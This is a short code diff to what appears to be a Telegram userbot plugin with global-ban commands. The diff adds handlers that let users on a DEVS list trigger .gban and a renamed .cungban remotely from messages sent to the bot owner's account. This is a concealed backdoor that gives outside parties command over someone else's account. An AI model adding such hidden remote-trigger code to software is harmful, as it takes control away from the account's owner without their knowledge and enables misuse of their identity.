@@ -102,6 +102,7 @@ async def get_user_from_event(event, uevent=None, secondgroup=None):
 
 
 @register(outgoing=True, pattern=r"^\.gban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.gban(?: |$)(.*)")
 async def gban(event):
     if event.fwd_from:
         return
@@ -190,6 +191,7 @@ async def gban(event):
 
 
 @register(outgoing=True, pattern=r"^\.ungban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
 async def ungban(event):
     if event.fwd_from:
         return
